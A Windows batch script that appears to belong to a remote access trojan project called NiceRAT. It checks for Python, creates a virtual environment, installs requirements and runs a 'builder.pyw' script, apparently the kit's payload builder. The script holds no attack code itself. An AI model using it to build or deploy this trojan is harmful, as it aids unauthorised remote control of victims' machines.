@echo off
title NiceRAT - Package Installer and Script Runner

:: Check if Python is installed
where python >nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed or not in PATH.
    powershell -File "install_python.ps1"
    where python >nul 2>&1
    if %errorlevel% neq 0 (
        echo Python installation failed. Please install manually.
        pause
        exit /b
    )
)

:: Create and activate virtual environment
echo Creating virtual environment...
python -m venv env
call env\Scripts\activate

:: Install dependencies from requirements.txt
echo Installing packages...
pip install -r requirements.txt
if %errorlevel% neq 0 (
    echo Failed to install packages.
    pause
    exit /b
)

echo Packages installed successfully.

:: Run the Python script
call python builder.pyw
if %errorlevel% neq 0 (
    echo Failed to run the builder script. Please check for errors.
    pause
    exit /b
)

echo Script completed successfully.
pause
